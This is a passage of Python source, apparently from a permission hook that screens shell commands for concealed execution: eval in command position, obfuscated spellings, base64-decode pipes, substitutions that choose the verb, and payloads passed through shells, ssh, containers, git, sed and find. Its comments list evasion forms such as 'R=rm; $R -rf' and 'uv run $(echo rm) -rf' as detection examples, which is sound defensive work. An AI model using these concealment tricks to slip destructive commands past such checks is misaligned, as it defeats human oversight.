                out.extend(_eval_producer_texts(stage))
    return out


def _eval_brace_expand(word: str, _budget: int = 256) -> List[str]:
    """Bash brace expansion of ``word`` (``{eval,ls}``, ``ev{al,}``), bounded; over the bound the
    word is returned with the builtin included, because an unexpandable list errs toward asking."""
    m = re.search(r"\{([^{}]*,[^{}]*)\}", word)
    if not m:
        return [word]
    parts = m.group(1).split(",")
    if len(parts) > _budget:
        return ["eval"]
    out: List[str] = []
    for part in parts:
        # the budget halves per group, so a product past the bound reaches ``len(parts) > _budget`` above
        out.extend(_eval_brace_expand(word[: m.start()] + part + word[m.end() :], _budget // len(parts)))
    return out


def _eval_aliases(command: str) -> frozenset:
    """Variables a same-command assignment sets to the builtin, directly or through another alias (``y=$x``)."""
    names = {m.group(1) for m in _EVAL_ALIAS_ASSIGN_RE.finditer(command)}
    # a ``for``/``select`` variable iterating a list that holds the builtin carries it into the body
    for m in _EVAL_FOR_LIST_RE.finditer(command):
        if any("eval" in _eval_brace_expand(w) for w in _words(m.group(2))):
            names.add(m.group(1))
    # ``read c`` / ``mapfile a`` / ``read -a a`` fed by a producer that holds it (pipe, here-string,
    # ``< <(…)``, heredoc): in a command that holds the word, the variables they set may carry it
    if _EVAL_READ_RE.search(command) and any(
        "eval" in t.split() for toks in _scan_masked_tokens(command) for t, _fq, _ex in toks
    ):
        for m in _EVAL_READ_RE.finditer(command):
            ids = [w for w in m.group(2).split() if re.fullmatch(r"[A-Za-z_]\w*", w)]
            names.update(ids or ["MAPFILE" if m.group(1) != "read" else "REPLY"])
    while True:
        more = {m.group(1) for m in _EVAL_ALIAS_COPY_RE.finditer(command) if m.group(2) in names} - names
        if not more:
            return frozenset(names)
        names |= more


def _eval_param_name(text: str) -> str:
    """The variable a leading ``$x`` / ``${x}`` / ``${x[0]}`` / ``"$x"`` expansion names."""
    m = re.match(r"\$\{?([A-Za-z_]\w*)", text)
    return m.group(1) if m else ""


def _eval_refs_alias(text: str, aliases: frozenset) -> bool:
    return any(re.search(r"\$\{?%s\b" % re.escape(name), text) for name in aliases)


def has_command_position_eval(command: str, _depth: int = 0, _guess: bool = False) -> bool:
    """Whether the dynamic-evaluation builtin is the VERB of some command (#1115).

    Guards the operation, not the phrasing: ``echo eval``, ``grep -rn eval``, a
    commit/PR/issue message, a ``send`` payload and a quoted heredoc body all
    contain the word and run nothing. Each command is read from the resolved
    token view (``e''val``, ``\\eval``, ``"eval"``, ``$'ev\\x61l'`` normalize to
    the literal), after backslash-newline joining, with leading compound-command
    syntax removed by the shared ``strip_command_openers`` (#1112). The verb is
    the first word after redirects (the whole bash redirect grammar), assignments
    and known launcher wrappers; ``eval`` there conceals, and so does a variable
    assigned the word earlier in the same command and used as the verb.

    The failure direction is ASK. A command word that is neither a known
    launcher nor a known pure data consumer is UNKNOWN: every later word is
    scanned for a shell ``-c`` payload and for the bare builtin, so a launcher
    this file has never heard of cannot hide a payload. Program text the shell
    is FED — ``-c`` payloads, ``ssh``, ``watch``, ``trap``, ``tmux`` runners,
    ``find -exec`` vectors, heredocs, here-strings, ``echo|printf … | sh`` through
    any pass-through stages, ``<(…)`` bodies handed to a shell — is re-checked as
    a command in its own right.
    """
    if _depth > _RESCAN_MAX_DEPTH:
        return True
    command = _eval_decode_dollar_quotes(command.replace("\\\n", ""))
    aliases = _eval_aliases(command)
    for text in _eval_fed_programs(command):
        if has_command_position_eval(text, _depth + 1) or _eval_refs_alias(text, aliases):
            return True
    if any(_eval_sed_executes(text) for text in _eval_fed_programs(command, _eval_sed_script_reader)):
        return True
    command = _EVAL_PROCSUB_RE.sub("; ( ", _strip_heredoc_bodies(command))
    command = _EVAL_AMP_REDIRECT_RE.sub(">", _EVAL_FD_DUP_RE.sub(" ", command))
    for toks in _scan_masked_tokens(command):
        if _eval_is_verb(strip_command_openers(toks), _depth, aliases, _guess):
            return True
    return False


def _eval_skip_options(toks: List[Tuple[str, bool, bool]], i: int, base: str) -> Tuple[int, Optional[str]]:
    """Past ``base``'s leading options (getopt clusters: ``-Eu root``, ``-I{}``); ``env -S`` yields its payload."""
    opts = _EVAL_WRAPPER_VALUE_OPTS[base]
    shorts = {o[1] for o in opts if len(o) == 2}
    n = len(toks)
    while i < n and not toks[i][1] and toks[i][0].startswith("-") and toks[i][0] != "-":
        w = toks[i][0]
        if w == "--":
            return i + 1, None
        if w.startswith("--"):
            name, eq, value = w.partition("=")
            if name == _EVAL_PAYLOAD_OPTS.get(base, ("", ""))[1]:
                return n, (value if eq else (toks[i + 1][0] if i + 1 < n else ""))
            i += 2 if name in opts and not eq else 1
            continue
        k = next((c for c, ch in enumerate(w[1:]) if ch in shorts), None)
        if k is None:
            i += 1
            continue
        glued = w[2 + k :]
        if w[1 + k] == _EVAL_PAYLOAD_OPTS.get(base, ("", ""))[0]:
            return n, (glued or (toks[i + 1][0] if i + 1 < n else ""))
        i += 1 if glued else 2
    return i, None


def _eval_shell_invocation(words: List[str], wrapper_style: bool) -> Tuple[Optional[str], List[str]]:
    """``(payload, arguments)`` of a shell run with ``-c`` / ``--command``, else ``(None, [])``.

    Plain shells (bash/sh/zsh/dash/ksh) parse options up to the first non-option word: ``-o|+o|-O|+O
    NAME`` and ``--rcfile|--init-file F`` take a value, other ``--long`` options are boolean, clusters
    (``-ec``, ``-lc``, ``-eo pipefail``) may hold ``c`` anywhere, ``--`` ends options, and the payload
    is the first non-option word. ``su``/``runuser``/``script``/``sg`` take positionals before ``-c``.
    """
    n = len(words)
    c_seen = terminated = False
    i = 0
    while i < n:
        w = words[i]
        if w == "--":
            i += 1
            terminated = True
            break
        if w.startswith("--command="):
            return w.partition("=")[2], words[i + 1 :]
        if w == "--command":
            c_seen = True
        elif w.startswith("--"):
            i += 1 if w not in ("--rcfile", "--init-file") else 2
            continue
        elif len(w) > 1 and w[0] in "-+" and w[1:].isalpha():
            letters = w[1:]
            c_seen = c_seen or (w[0] == "-" and "c" in letters)
            i += 2 if letters[-1] in "oO" else 1
            continue
        elif wrapper_style and not c_seen:
            i += 1  # su root -c …
            continue
        else:
            break
        i += 1
    if c_seen and i < n:
        return words[i], words[i + 1 :]
    # Stopped on an option shape this grammar does not model (``-O3``, ``-``): not parsed with
    # confidence, so any later ``-…c`` cluster / ``--command`` still names a payload (the first
    # non-option word after it). Over-asks, never under-asks. A stop on a plain word is a script
    # file; its arguments (``bash script.sh -c x``) are data.
    if terminated or i >= n or words[i][:1] not in "-+":
        return None, []
    for j, w in enumerate(words):
        if w == "--command" or re.fullmatch(r"-[A-Za-z]*c", w):
            k = next((m for m in range(j + 1, n) if words[m] != "--" and not words[m].startswith("-")), None)
            if k is not None:
                return words[k], words[k + 1 :]
    return None, []


_EVAL_POSITIONAL_VERB_RE = _rx(r"(?:^|[;&|(]\s*|\b(?:exec|command|env|xargs|time|nohup)\s+)\"?\$(?:[0-9@*]|\{[0-9@*#])", 0)


def _eval_run_shell(base: str, rest: List[str], aliases: frozenset, rescan, rescan_guess) -> bool:
    """A shell (or ``su``-style runner) at the verb: is its ``-c`` payload, or what the payload runs, the builtin?"""
    payload, args = _eval_shell_invocation(rest, base in ("su", "runuser", "script", "sg"))
    if payload is None:
        return False
    if rescan([payload]):
        return True
    if _eval_refs_alias(payload, aliases):
        return True  # the payload expands a variable holding the builtin
    if _EVAL_POSITIONAL_VERB_RE.search(payload):
        # ``sh -c '$1' _ eval x``: the arguments ARE the command text
        return any(w == "eval" or (any(c.isspace() for c in w) and rescan_guess([w])) for w in args)
    return False


_EVAL_SED_E_COMMAND_RE = _rx(r"(?:^|[;{}\n]|[0-9$/IM]|\\([^\w\s\\])(?:(?!\1).)*\1)\s*!?\s*e(?:\s|$)", 0)
_EVAL_SED_S_FLAG_E_RE = _rx(r"(?:^|[;{}\n])[ \t]*(?:[0-9$,~]+|/(?:\\.|[^/\\\n])*/)?[ \t]*!?[ \t]*s([^\w\s\\]|_)(?:\\.|(?!\1).)*\1(?:\\.|(?!\1).)*\1[a-zA-Z0-9]*e", 0)


def _eval_sed_executes(arg: str) -> bool:
    """A sed script whose ``e`` command or ``s///e`` flag runs text that is, or holds, the builtin.

    ``sed '1e eval x'``, ``sed -e '/p/e eval x'``, ``sed 's/a/eval x/e'``. Only these two executing
    forms are modelled; a script that does not hold the word is data whatever it does.
    """
    if not re.search(r"(?<![\w-])eval(?![\w-])", arg):
        return False
    return bool(_EVAL_SED_E_COMMAND_RE.search(arg) or _EVAL_SED_S_FLAG_E_RE.search(arg))


def _eval_git_payload(rest: List[str], rescan) -> bool:
    """git subcommands that run a command line: ``rebase --exec|-x``, ``bisect run``, ``submodule foreach``."""
    if "rebase" in rest:
        for j, w in enumerate(rest):
            if w in ("--exec", "-x") and j + 1 < len(rest) and rescan([rest[j + 1]]):
                return True
            if w.startswith("--exec=") and rescan([w.partition("=")[2]]):
                return True
    if "bisect" in rest and "run" in rest:
        return rescan(rest[rest.index("run") + 1 :])
    if "submodule" in rest and "foreach" in rest:
        return rescan([w for w in rest[rest.index("foreach") + 1 :] if not w.startswith("--")])
    return False


# ``docker run`` options that take a value (their value is never the image); ``--entrypoint`` is a PROGRAM.
_CONTAINER_VALUE_OPTS = frozenset({
    "-e", "--env", "--env-file", "-v", "--volume", "-p", "--publish", "-w", "--workdir", "-u", "--user",
    "-l", "--label", "-h", "--hostname", "-m", "--memory", "--name", "--network", "--net", "--platform",
    "--mount", "--add-host", "--cap-add", "--cap-drop", "--device", "--dns", "--restart", "--pull",
    "--cpus", "--gpus", "--ipc", "--pid", "--shm-size", "--tmpfs", "--ulimit", "--user-ns", "--group-add",
    "--log-driver", "--log-opt", "--security-opt", "--stop-signal", "--stop-timeout", "-c", "--cpu-shares",
    "-a", "--attach", "--detach-keys",
})


# Options that sit BEFORE the subcommand and take a value: docker's, compose's and podman's.
_CONTAINER_GLOBAL_VALUE_OPTS = frozenset({
    "-H", "--host", "--context", "-c", "-l", "--log-level", "--config", "--tlscacert", "--tlscert",
    "--tlskey", "-f", "--file", "-p", "--project-name", "--profile", "--env-file", "--project-directory",
    "--ansi", "--parallel", "--connection", "--url", "-r", "--remote", "--identity", "--root", "--runroot",
})


def _container_subcommand(rest: List[str], start: int) -> Optional[int]:
    """Index of the first subcommand word at/after ``start``, skipping global options and their values."""
    i = start
    while i < len(rest):
        w = rest[i]
        if not w.startswith("-"):
            return i
        i += 2 if w in _CONTAINER_GLOBAL_VALUE_OPTS else 1
    return None


def _eval_container_command(rest: List[str]) -> Optional[List[str]]:
    """The command words ``docker|podman run|exec [opts] IMAGE|CONTAINER cmd …`` launches, or None.

    The image / container is one positional; ``--entrypoint`` replaces the image's program, so its
    value joins the command. Anything this does not parse as a run/exec returns None (the caller
    falls back to the old unknown-command scan, which asks).
    """
    sub = _container_subcommand(rest, 0)
    while sub is not None and rest[sub] in ("container", "compose"):  # ``docker container exec`` / ``docker compose run``
        sub = _container_subcommand(rest, sub + 1)
    if sub is None or rest[sub] not in ("run", "exec"):
        return None
    args = rest[sub + 1 :]
    entry: List[str] = []
    i = 0
    while i < len(args) and args[i].startswith("-") and args[i] != "--":
        w = args[i]
        name, eq, value = w.partition("=")
        if name == "--entrypoint":
            entry.append(value if eq else (args[i + 1] if i + 1 < len(args) else ""))
        i += 2 if (name in _CONTAINER_VALUE_OPTS or name == "--entrypoint") and not eq else 1
    if i < len(args) and args[i] == "--":
        i += 1
    return entry + args[i + 1 :] if i < len(args) else entry


def _eval_unknown(rest: List[str], rescan_guess) -> bool:
    """An UNKNOWN command word: scan everything it was given (ask, never allow).

    The bare word asks, and so does any quoted multi-word argument whose own verb is the builtin
    (a ``-c`` payload, ``parallel 'eval {}'``, ``flock f -c '…'``).
    """
    return any(w == "eval" or (any(c.isspace() for c in w) and rescan_guess([w])) for w in rest)


def _eval_is_verb(toks: List[Tuple[str, bool, bool]], depth: int, aliases: frozenset, guess: bool) -> bool:
    """One command's tokens (openers already stripped): is its verb the builtin, or a payload runner of it?"""
    def rescan(words: List[str]) -> bool:
        return bool(words) and has_command_position_eval(" ".join(words), depth + 1)

    def rescan_guess(words: List[str]) -> bool:
        return bool(words) and has_command_position_eval(" ".join(words), depth + 1, True)

    # an unquoted word starting ``#`` opens a comment that runs to the end of the line
    comment = next((k for k, (t, fq, _ex) in enumerate(toks) if not fq and t.startswith("#")), None)
    if comment is not None:
        toks = toks[:comment]
    texts = [t for t, _fq, _ex in toks]
    i, n = 0, len(toks)
    while i < n:
        text, fq, _ex = toks[i]
        if not fq:
            m = _EVAL_REDIRECT_RE.match(text)
            if m:
                i += 1 if m.group(1) else 2  # a bare operator takes the NEXT word as target
                continue
            if _ASSIGN_TOKEN_RE.match(text):
                i += 1
                continue
        if text == "eval" or (text[:1] == "$" and (_eval_param_name(text) in aliases or "eval" in text)):
            return True
        if fq and any(ch.isspace() for ch in text) and rescan_guess([text]):
            return True  # a whole command LINE in the verb slot (``flock f 'eval {}'``)
        base = text.rsplit("/", 1)[-1]
        rest = texts[i + 1 :]
        if base in _EVAL_WRAPPER_VALUE_OPTS:
            if base == "command" and any(re.fullmatch(r"-[A-Za-z]*[vV][A-Za-z]*", w) for w in rest[:2]):
                return False  # a lookup, not an execution
            i, payload = _eval_skip_options(toks, i + 1, base)
            if payload is not None:
                return rescan([payload])
            if i < n and texts[i] in _EVAL_DATA_SUBCOMMANDS.get(base, ()):
                return False
            for sub in _EVAL_WRAPPER_SUBCOMMANDS.get(base, ()):
                if i < n and texts[i] == sub:
                    i, payload = _eval_skip_options(toks, i + 1, base)
                    if payload is not None:
                        return rescan([payload])
            if base in ("timeout", "flock"):
                i += 1  # the duration / the lock file
            if base == "flock" and i < n and re.fullmatch(r"-[A-Za-z]*c|--command", texts[i]):
                return rescan(texts[i + 1 : i + 2])  # ``flock LOCK -c '…'`` hands the string to a shell
            if base == "parallel":
                data = next((k for k in range(i, n) if texts[k] in _PARALLEL_SEPARATORS), n)
                # the command is ONE shell string (``parallel 'eval {}' ::: a``) or words up to ``:::``
                return rescan(texts[i:data]) or any(
                    any(ch.isspace() for ch in w) and rescan_guess([w]) for w in texts[i:data]
                )
            if base == "watch":
                return rescan(texts[i:])
            continue
        if base in _SHELL_NAMES or base in ("runuser", "script", "sg"):
            # ``runuser -u u -- sh -c …`` runs a command of its own: nothing parsed here means scan it
            return _eval_run_shell(base, rest, aliases, rescan, rescan_guess) or (
                base not in _SHELL_NAMES and _eval_unknown(rest, rescan_guess)
            )
        if base in ("for", "select"):
            return False  # a word LIST (``for f in a eval``), not a command; the body is its own segment
        if base in _CONTAINER_RUNNERS:
            launched = _eval_container_command(rest)
            if launched is not None:
                return rescan(launched)
        if base in _EVAL_DATA_SUBCOMMANDS and base not in _EVAL_WRAPPER_VALUE_OPTS:
            first = next((w for w in rest if not w.startswith("-")), None)
            if first in _EVAL_DATA_SUBCOMMANDS[base]:
                return False
        if base == "git" and _eval_git_payload(rest, rescan):
            return True
        if base in ("sed", "gsed") and any(
            _eval_sed_executes(w) or _eval_sed_executes(w.partition("=")[2] if w.startswith("--expression=") else w[2:] if w.startswith("-e") else "")
            for w in rest
        ):
            return True
        if base in _EVAL_PROJECT_RUNNERS:
            for w in rest:
                if w.startswith("--call=") and rescan([w.partition("=")[2]]):
                    return True
            launched = next((j for j, w in enumerate(rest) if w in ("exec", "dlx", "x")), None)
            if launched is not None and base != "make":
                cmd = list(rest[launched + 1 :])
                while cmd and cmd[0].startswith("-"):  # options, ``--``, and ``-c``/``--call`` before the payload
                    cmd = cmd[1:]
                return rescan(cmd)
            if any(w in ("exec", "dlx", "x") or w.startswith(("SHELL=", ".SHELLFLAGS=", "SHELL:="))
                   or os.path.basename(w) in _EVAL_SHELLS for w in rest):
                return _eval_unknown(rest, rescan_guess)
            return False
        if base == "trap":
            args = [w for w in rest if w != "--"]
            return rescan(args[:1])
        if base == "tmux":
            # send-keys types into a pane (another session, guarded by its own hook): data here
            if not _EVAL_TMUX_RUNNERS.intersection(rest):
                return False
            return any(rescan([w]) for w in rest if " " in w)
        if base in ("ssh", "slogin", "mosh"):
            return rescan([w for w in _ssh_remote_command(rest) if w != "--"])
        if base == "find":
            for j, w in enumerate(rest):
                if w in _EVAL_FIND_EXEC:
                    # only the vector's head decides; a later -exec is visited by this loop
                    if rescan(rest[j + 1 :]):
                        return True
            return False
        if base in _EVAL_DATA_CONSUMERS:
            return False
        if guess:
            return False
        return _eval_unknown(rest, rescan_guess)
    return False


_BASE64_PIPE_RE = re.compile(r"\bbase64\b[^\n|]*(?:-d|--decode)[^\n|]*\|", re.IGNORECASE)
_ASSIGN_RE = re.compile(
    r"(?:^|[\n;&|]|&&|\|\|)\s*([A-Za-z_]\w*)=('[^']*'|\"[^\"]*\"|[^\s;|&]*)"
)
_SHELL_OPERATORS = {";", "&&", "||", "|", "&", "\n", ";;", "|&"}


# INERT VIEW — what the ambiguity analysis (normalize_subcommands,
# ambiguity_conceals_verb) is allowed to see. Two things the shell treats as
# DATA were being read as SYNTAX, and every ordinary multi-line commit or
# ``python3 - <<'EOF'`` paid for it with a confirm dialog (an apostrophe in a
# heredoc body read as "unbalanced quotes", its parentheses as a "subshell",
# a ``\``` inside double quotes as an unbalanced substitution):
#
#   * the body of a QUOTED-delimiter heredoc (``<<'EOF'`` / ``<<"EOF"`` /
#     ``<<\EOF``) — the shell performs no expansion in it, so it is literal text;
#   * a backtick or ``$(`` inside single quotes, or a backslash-escaped
#     backtick / ``$(`` — likewise literal characters.
#
# This view feeds ONLY the ambiguity fallback. Rule matching still reads the raw
# command (every haystack list leads with it), so a destructive verb or a
# protected path inside a heredoc body is matched exactly as before.
#
# Left untouched, so they keep failing closed: an UNQUOTED heredoc (its body
# expands ``$(...)``), an unterminated heredoc, a heredoc whose marker sits
# inside a quoted string (not a real heredoc), and a heredoc that FEEDS A SHELL
# (``bash <<'EOF'`` — the body is the program, a payload like ``sh -c``).

_HEREDOC_BODY = "heredoc-body"
_LITERAL_CHAR = "\x01"
_HEREDOC_SHELL_CONSUMERS = {"ssh", "eval", "source", "."}


def _heredoc_feeds_shell(prefix: str) -> bool:
    """True when the command a heredoc is attached to runs its stdin as shell."""
    segment = re.split(r"[;&|\n(`]", prefix)[-1]
    return any(
        word.rsplit("/", 1)[-1] in (_SHELL_NAMES | _HEREDOC_SHELL_CONSUMERS)
        for word in segment.split()
    )


def _heredoc_piped_to_program(command: str, h: "_Heredoc") -> bool:
    """Whether the pipe on a heredoc's marker line carries its body to a shell (``cat <<'EOF' | sh``)."""
    _marker, pipe, consumer = command[h.start : h.body_start].partition("|")
    return bool(pipe) and _eval_shell_consumer(_command_words(consumer))


def _heredoc_feeds_program_file(h: "_Heredoc") -> bool:
    """Whether a heredoc is read as a makefile / justfile / sed script (``make -f - <<'EOF'``): its body is a program."""
    words = _feed_words(h.line)
    return _eval_makefile_reader(words) or _eval_sed_script_reader(words)


def _neutralize_literal_heredocs(command: str) -> str:
    """Replace each literal heredoc body with one inert line (see INERT VIEW)."""
    out: List[str] = []
    pos = 0
    for h in _heredocs(command):
        if (
            not h.quoted
            or _heredoc_feeds_shell(command[: h.start])
            or _heredoc_piped_to_program(command, h)
            or _heredoc_feeds_program_file(h)
        ):
            continue
        out.append(command[pos : h.body_start])
        out.append(_HEREDOC_BODY + "\n")
        pos = h.body_end
    out.append(command[pos:])
    return "".join(out)


def _blank_literal_substitutions(command: str) -> str:
    """Blank backticks / ``$(`` the shell reads as literal characters."""
    out: List[str] = []
    n = len(command)
    i = 0
    single = double = False
    while i < n:
        c = command[i]
        if single:
            if c == "'":
                single = False
                out.append(c)
            elif c == "`" or command.startswith("$(", i):
                out.append(_LITERAL_CHAR)
            else:
                out.append(c)
            i += 1
        elif c == "\\" and i + 1 < n:
            nxt = command[i + 1]
            literal = nxt == "`" or (nxt == "$" and command.startswith("(", i + 2))
            out.append(c)
            out.append(_LITERAL_CHAR if literal else nxt)
            i += 2
        else:
            if c == "'" and not double:
                single = True
            elif c == '"':
                double = not double
            out.append(c)
            i += 1
    return "".join(out)


def inert_view(command: str) -> str:
    """``command`` with literal-data spans neutralized, for ambiguity analysis only."""
    return _blank_literal_substitutions(_neutralize_literal_heredocs(command))


def detect_obfuscation(command: str) -> Optional[str]:
    """Return a reason string if ``command`` hides intent behind shell features.

    These constructs can smuggle a dangerous command past static matching, so we
    decline to reason about them and fail closed instead.
    """
    if _SUBSTITUTION_RE.search(command):
        return "command substitution"
    if has_command_position_eval(command):
        return "eval"
    if _BASE64_PIPE_RE.search(command):
        return "base64-decode pipeline"
    return None


_SCRIPT_OPERAND_RE = re.compile(r"\.(?:py|js|mjs|cjs|ts|sh|bash|zsh|rb|pl|php|lua)$")


def _substitution_in_payload(head: str, args: List[str]) -> bool:
    """Whether a masked substitution in ``args`` lands where ``head`` takes CODE.

    ``python3 -c "$(cat x)"`` runs what the substitution prints; ``python3
    script.py $(date)`` only hands it to the script as data. Reading words left
    to right: a substitution BEFORE the script operand is concealment (a payload
    flag's value, an option value, or the thing that chooses what runs); once a
    script operand (a path or a known script extension, ``-m <module>``, or ``-``
    for stdin) has been seen, the rest are that script's arguments: data. With
    no script operand in sight the whole line is conservatively concealment.
    Surfaces whose payload is positional (``awk``, ``tmux``, ``sqlite3``) and
    ``ssh`` (everything after the host is the remote command) keep the
    anywhere-rule.
    """
    sentinel = _CMD_SUBST_SENTINEL
    if head == "ssh":
        return any(sentinel in t for t in args)
    if head not in _SHELL_NAMES and not _EXEC_SURFACES.get(head):
        return any(sentinel in t for t in args)
    for i, tok in enumerate(args):
        if tok == "-m" and i + 1 < len(args):
            return sentinel in args[i + 1]
        if sentinel in tok:
            return True
        if tok == "-" or (not tok.startswith("-") and _SCRIPT_OPERAND_RE.search(tok)):
            return False
    return False


def ambiguity_conceals_verb(command: str) -> Optional[str]:
    """Which verb-concealing shape makes ``command`` unverifiable, or None.

    Two different populations fall to the ambiguity fallback and used to share
    one tier (#934):

    * **verb concealment** — eval, a base64-decode pipeline, unbalanced
      quotes, or a substitution that decides WHAT RUNS (command position,
      behind a launcher chain, or the payload of a wrapper/exec surface).
      Nothing can analyze these; bypass must NOT demote them to allow.
    * **operand substitution** — ``$(...)`` in an ordinary argument position
      (``echo "$(basename $p)"``, a ``-m`` message). Every rule has already
      scanned the masked form; the residual ask is a courtesy confirm, and
      bypass demoting it is the documented trade.

    Judged by POSITION, not presence (#942/#943): substitutions are masked to
    a sentinel first, then each segment is walked. Anything this function
    cannot place — a subshell, an unsplittable segment — is treated as
    concealing, which errs closed.
    """
    masked, mask_err = _mask_command_substitutions(inert_view(command))
    if mask_err:
        return mask_err
    if has_command_position_eval(masked):
        return "eval"
    if _BASE64_PIPE_RE.search(masked):
        return "base64-decode pipeline"
    segments, split_err = _scope_segments(_newlines_as_separators(masked), grouping_ok=True)
    if split_err:
        return split_err
    for argv, _op in segments:
        _assigns, argv = _split_assignments(strip_command_opener_words(argv))
        if not argv:
            continue
        # Walk the launcher chain (sudo, env, uv run, timeout 5 …) to the real
        # command. A sentinel anywhere in that chain — including as the head
        # itself, or as the next link (`uv run $(echo rm) -rf`) — decides what
        # runs.
        head: Optional[str] = None
        head_idx = 0
        prev_was_option = False
        for i, tok in enumerate(argv):
            if _CMD_SUBST_SENTINEL in tok:
                return "command substitution decides what runs"
            base = tok.rsplit("/", 1)[-1]
            if base in _POSITION_WRAPPERS or _ASSIGN_TOKEN_RE.match(tok):
                prev_was_option = False
                continue
            if tok.startswith("-"):
                prev_was_option = True
                continue
            if prev_was_option or tok[:1].isdigit():
                prev_was_option = False
                continue
            head, head_idx = base, i
            break
        if head is None:
            continue
        # A substitution in the arguments of a payload-executing command (a
        # shell, an exec surface like python -c / psql -c, or ssh) is text
        # something will EXECUTE, not an operand. `psql -c "$(cat drop.sql)"`
        # is the motivating case — the permissive path used to be obscuring
        # the payload behind a substitution.
        if head in _SHELL_NAMES or head in _EXEC_SURFACES or head == "ssh":
            if _substitution_in_payload(head, argv[head_idx + 1:]):
                return f"command substitution is the payload of {head}"
    return None


def normalize_subcommands(command: str) -> Tuple[List[str], Optional[str]]:
    """Tokenize ``command`` and return ``(normalized_subcommands, ambiguous)``.

    ``normalized_subcommands`` is the per-subcommand argv re-joined with single
    spaces, after ``shlex`` has stripped quotes/escapes and simple ``$VAR``
    assignments earlier in the same command have been resolved. ``ambiguous`` is
    a reason string when the command can't be tokenized safely (and the caller
    should fail closed); it is ``None`` on success.
    """
    command = inert_view(command)
    obf = detect_obfuscation(command)
    if obf:
        return [], obf

    # Resolve simple ``VAR=value`` assignments so ``R=rm; $R -rf`` normalizes to
    # ``rm -rf``. Only literal values (no nested expansion) are resolved.
    assigns: Dict[str, str] = {}
    for m in _ASSIGN_RE.finditer(command):
        assigns[m.group(1)] = m.group(2).strip("'\"")

    try:
        lex = shlex.shlex(command, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        tokens = list(lex)
    except ValueError:
        return [], "unbalanced quotes"

    def _resolve(tok: str) -> str:
        for name, val in assigns.items():
            tok = tok.replace("${%s}" % name, val).replace("$" + name, val)
        return tok

    subs: List[str] = []
    cur: List[str] = []
    for tok in tokens:
        if tok in _SHELL_OPERATORS:
            if cur:
                subs.append(" ".join(cur))
                cur = []
            continue
        cur.append(_resolve(tok))
    if cur:
        subs.append(" ".join(cur))
    return subs, None


#
# CONTENT MASKING (#675)
#
# Tooldef rules are COMMAND-PREFIX rules (``\bgh\s+pr\s+comment\b``), but the
# haystacks above include quoted argument text — so a commit message that
# merely *mentions* "gh pr comment" false-matches the rule. Anchored rules are
# therefore matched against MASKED subcommands instead: quoted spans that can
# only be content (a quoted token containing whitespace — a message, an echo
# string, a heredoc body) are replaced with a placeholder, while quoted
# single words are kept (``"gh" pr comment`` is still a real command) and
# ``sh -c "…"`` payloads are recursively re-scanned as commands.

_MASK = "\x00"
# ``su -c`` runs its argument through a login shell, so it belongs here
# for the same reason: the value is a command, not content.
_SHELL_NAMES = {"sh", "bash", "zsh", "dash", "ksh", "su"}

#: EXEC SURFACES (#915 review, class of #924).
#:
#: A quoted multi-word token is masked as content — right for ``git commit -m
#: "<prose>"``, and WRONG when the token is the value of an option the tool
#: EXECUTES. Once the rule files are anchored the raw haystack is no longer
#: consulted, so masking such a payload takes it from BLOCK to allow with NO
#: rule matching at all: no grant consulted, and no ``core.ambiguous-command``
#: backstop either, because with no ``$(`` the ambiguity detector never fires.
#:
#: The distinguisher cannot be SYNTAX — ``$(`` is one route here, not the
#: defining property — and it cannot be ADDITIVITY: emitting every masked token
#: as its own entry fixes all of these and reinstates #915 for all prose,
#: because a report payload becomes a command-position entry again. It has to be
#: POSITION: is this token the value of an exec-surface option? That needs a
#: table, and this is the minimal instance of #924's eventual one.
#:
#: Value = the option flags whose value is the payload. An EMPTY set means the
#: payload arrives positionally (``tmux new-session -d '<cmd>'``, ``watch -n1
#: '<cmd>'``, ``awk '<program>'``), so any content token on that command counts.
#:
#: Distinct from ``_SHELL_NAMES``, which means "this payload is a shell command"
#: and so gets RE-PARSED into subcommands. Here the payload is executable text
#: that merely contains a command (``python3 -c 'os.system("…")'``), so it is
#: emitted as a haystack string instead of re-parsed as shell.
#:
#: Missing an exec surface degrades to exactly today's behaviour, not worse.
_EXEC_SURFACES: Dict[str, set] = {
    "python": {"-c"}, "python3": {"-c"}, "python2": {"-c"},
    "perl": {"-e", "-E"},
    "ruby": {"-e"},
    "node": {"-e", "-p", "--eval"},
    "deno": {"-e", "--eval"},
    "php": {"-r"},
    # Embedded-language interpreters (#18): the operand of the inline flag is a
    # PROGRAM that can shell out (``os.execute``, ``system()``, ``do shell
    # script``), emitted as payload text exactly like ``python3 -c``. tclsh /
    # wish take no inline flag: their program is a script file or stdin.
    "lua": {"-e"}, "luajit": {"-e"},
    "R": {"-e"}, "Rscript": {"-e"},
    "julia": {"-e", "-E", "--eval", "--print"},
    "groovy": {"-e"},
    "osascript": {"-e"},
    "tclsh": set(), "wish": set(), "expect": {"-c"},
    "make": {"-c"},
    "tmux": set(),
    "watch": set(),
    "awk": set(), "gawk": set(), "mawk": set(),
    # Database clients (#924): the quoted operand of these flags is a STATEMENT
    # the server executes. Not shell — emitted as payload text (matched
    # anywhere, never re-parsed as shell), so the unanchored SQL/eval rules in
    # payloads.yaml see it even when masking would otherwise blank the token.
    "psql": {"-c", "--command"},
    "mysql": {"-e", "--execute"}, "mariadb": {"-e", "--execute"},
    "mongosh": {"--eval"}, "mongo": {"--eval"},
    "sqlite3": set(),
    "duckdb": {"-c"},
}
_ASSIGN_TOKEN_RE = re.compile(r"^[A-Za-z_]\w*(?:\[[^\n]*?\])?\+?=")

#
# COMMAND-WRAPPER PAYLOAD RESCAN (#924)
#
# ``ssh <host> "<payload>"`` is a command wrapper: its trailing argument is a
# SHELL COMMAND that runs remotely. Before this table, remote.yaml hand-wrote
# a twin of ~12 local rules and every OTHER rule silently did not apply over
# ssh — coverage was incidental to whether an unanchored rule happened to
# match the payload text. The structural fix mirrors the existing ``sh -c``
# recursion: extract the remote command and RESCAN it as a command in its own
# right, so every rule (anchored ones included, at real command positions)
# applies to the wrapped form automatically.
#
# ssh's grammar is options → host → command; everything after the first
# non-option token is the remote command (OpenSSH stops option parsing at the
# host). The value-taking option set below is from the OpenSSH 9.x manual
# (documented provenance — the local binary's private build may differ, but a
# wrong entry here degrades to today's behaviour: payload not rescanned).
_SSH_VALUE_OPTS = frozenset({
    "-B", "-b", "-c", "-D", "-E", "-e", "-F", "-I", "-i", "-J", "-L", "-l",
    "-m", "-O", "-o", "-p", "-R", "-S", "-W", "-w",
})
# Bound on wrapper/payload recursion (``ssh a "ssh b '…'"`` is legal). Each
# hop strips a layer of quoting so real chains are shallow; 5 is headroom.
_RESCAN_MAX_DEPTH = 5


def _ssh_remote_payload(raws: List[str]) -> Optional[str]:
